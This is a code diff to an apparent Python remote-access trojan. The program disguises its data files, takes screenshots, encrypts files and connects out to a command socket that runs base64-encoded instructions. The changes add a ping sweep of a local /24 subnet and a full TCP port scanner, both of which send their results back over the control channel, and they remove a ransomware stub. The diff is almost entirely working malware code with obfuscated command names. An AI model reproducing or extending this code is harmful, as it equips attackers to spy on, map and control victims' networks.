@@ -14,7 +14,11 @@ import psutil
 import base64
 import tempfile
 from base64 import b64decode
+import ipaddress
+import asyncio
 import secrets
+import concurrent
+from concurrent import futures
 from PIL import ImageGrab
 from cryptography.hazmat.backends import default_backend
 from cryptography.hazmat.primitives import padding
@@ -22,6 +26,10 @@ from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
 import requests
 
 # Variables globales
+my_list_of_tasks = []
+my_tasks = []
+nbr_host_found = 0
+list_of_hosts_found = []
 
 try:
     apdt = os.environ['appdata']
@@ -32,6 +40,105 @@ except KeyError:
     tmp = "/tmp/"
     kygerth = tmp + "processmanager.txt"
     cook_th = tmp + "handlermanager.txt"
+
+
+async def ping_coroutine(cmd, ip):
+
+    global nbr_host_found, list_of_hosts_found
+
+    running_coroutine = await asyncio.create_subprocess_shell(
+        cmd,
+        stdout=asyncio.subprocess.PIPE,
+        stderr=asyncio.subprocess.PIPE)
+
+    stdout = await running_coroutine.communicate()
+
+    if "ttl=" in str(stdout).lower():
+        nbr_host_found += 1
+        list_of_hosts_found.append(ip)
+
+async def ping_loop():
+
+    global my_tasks, my_list_of_tasks
+    for each_task_list in my_list_of_tasks:
+        for each_coroutine in asyncio.as_completed(each_task_list):
+            await each_coroutine
+
+
+
+class Networkscan:
+
+
+    def __init__(self, ip_and_prefix):
+
+
+        self.nbr_host_found = 0
+        self.list_of_hosts_found = []
+
+        self.filename = "hosts.yaml"
+
+        try:
+
+            self.network = ipaddress.ip_network(ip_and_prefix)
+
+        except:
+            sys.exit("Incorrect network/prefix " + ip_and_prefix)
+
+        self.nbr_host = self.network.num_addresses
+
+        if self.network.num_addresses > 2:
+            self.nbr_host -= 2
+
+        self.one_ping_param = "ping -n 1 -l 1 -w 1000 " if platform.system().lower() == "windows" else "ping -c 1 -s 1 -w 1 "
+
+    def run(self):
+
+        global my_tasks, nbr_host_found, list_of_hosts_found, my_list_of_tasks
+
+        self.nbr_host_found = 0
+        self.list_of_hosts_found = []
+        my_tasks = []
+        nbr_host_found = 0
+        list_of_hosts_found = []
+
+        i = 128
+
+        my_list_of_tasks = []
+
+        my_list_of_tasks.append(my_tasks)
+
+        if self.network.num_addresses != 1:
+
+            for host in self.network.hosts():
+
+                cmd = self.one_ping_param + str(host)
+
+                my_tasks.append(ping_coroutine(cmd, str(host)))
+
+                i -= 1
+
+                if i <= 0:
+                    i = 128
+
+                    my_tasks = []
+                    my_list_of_tasks.append(my_tasks)
+        else:
+
+
+            host = str(self.network.network_address)
+
+            cmd = self.one_ping_param + host
+
+            my_tasks.append(ping_coroutine(cmd, host))
+
+        if platform.system().lower() == "windows":
+            asyncio.set_event_loop_policy(
+                asyncio.WindowsProactorEventLoopPolicy())
+
+        asyncio.run(ping_loop())
+
+        self.list_of_hosts_found = list_of_hosts_found
+        self.nbr_host_found = nbr_host_found
 
 
 def crte():
@@ -145,9 +252,9 @@ def init_crypt_file(file, key):
 
     encrypted_file_data = encrypt(content, key)
     with open(file, "wb") as f:
-        f.write(key + encrypted_file_data)
+        f.write(encrypted_file_data)
 
-    return encrypted_file_data, key
+    return encrypted_file_data
 
 
 def list_files_in_directory(directory):
@@ -236,15 +343,15 @@ def make_conect ():
     while True:
         sock = socket . socket (socket . AF_INET ,socket . SOCK_STREAM)
         #try:
-        sock.connect ( ( '127.0.0.1' ,1337) )
+        sock.connect ( ( '127.0.0.1' ,2457) )
         sock = context . wrap_socket (sock)
         game (sock)
         time . sleep (5)
-        #except Exception as e:
-        #    print(e)
-        time.sleep (10)
-        make_conect ()
-
+        """except Exception as e:
+            print(e)
+            time.sleep (10)
+            make_conect ()
+        """
 
 def srtTks():
     try:
@@ -554,8 +661,53 @@ def cntread(xx):
         return str(e)
 
 
-def c3RydFJuc29tCg():
-    pass
+def scnet():
+    scn = Networkscan("192.168.131.0/24")
+    scn.run()
+    hs = scn.list_of_hosts_found
+    sock.send(str(scn.nbr_host_found).encode())
+    for h in hs:
+        sock.send(h.encode())
+    #sock.send("end".encode())
+
+
+def init_scan(target):
+    ports = 65535
+    open_ports = []
+    def scaning(port):
+        if port % 50 == 0:
+            #▒
+            r = "\r" + '\tScaning Port : %s/%s [%s%s] %.2f%%' % (port, ports, "▓" * int(port * 25 / ports),
+                                                                    "▒" * (25 - int(port * 25 / ports)),
+                                                                    float(port / ports * 100))
+            sock.send(str(r).encode())
+
+        # Creamos el Socket para la conexión
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        # Definimos tiempo máximo de espera a la conexion
+        socket.setdefaulttimeout(0.15)
+
+        try:
+            # creamos la conexion
+            result = s.connect_ex((target, port))
+            # Si resulta victorioisa la conexion informamos de puerto abierto
+            if result == 0:
+                open_ports.append(port)
+        except Exception as e:
+            sock.send("Error inesperado : {}".format(err).encode())
+        finally:
+            s.close()
+
+    with concurrent.futures.ThreadPoolExecutor(max_workers=25) as executor:
+        futures = []
+        for port in range(1, ports + 1):
+            try:
+                futures.append(executor.submit(scaning, port))
+            except Exception as err:
+                sock.send("Error inesperado : {}".format(err).encode())
+
+    sock.send(str(open_ports).encode())
+    time.sleep(0.1)
 
 
 def game (sock):
@@ -626,8 +778,11 @@ def game (sock):
         elif "c2NyZWVuc2hvdAo=" .encode () in instruct:
             tk_nd_sd_sht()
 
-        elif "cmFuc29tCg==" .encode () in instruct:
-            c3RydFJuc29tCg()
+        elif "c2Nhbm5ldAo=" .encode () in instruct:
+            scnet()
+
+        elif "c2Nhbmhvc3QK" .encode() in instruct:
+            init_scan(instruct.decode() .replace("c2Nhbmhvc3QK ", ""))
 
         else:
             pass
@@ -637,8 +792,9 @@ def main ():
     t1 = threading.Thread(target=start)
     t1.start()
 
-    startThread = threading . Thread (target=make_conect)
-    startThread .start ()
+    """startThread = threading . Thread (target=make_conect)
+    startThread .start ()"""
+    make_conect()
 
 
 
